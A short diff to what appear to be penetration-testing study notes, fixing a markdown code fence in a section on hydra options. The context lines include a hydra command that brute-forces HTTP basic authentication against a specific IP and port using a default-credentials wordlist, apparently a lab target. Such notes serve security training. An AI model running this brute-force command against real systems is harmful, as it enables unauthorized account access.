@@ -18,7 +18,8 @@ The most commonly used password wordlists is rockyou.txt, which has over 14 mill
 SERVER_IP	Target IP
 -s PORT	Target Port
 http-get	Request Method
-/	Target Path```
+/	Target Path
+```
 
 ------Basic HTTP Auth Brute Forcing------
 hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 46.101.20.243 -s 32221 http-get /
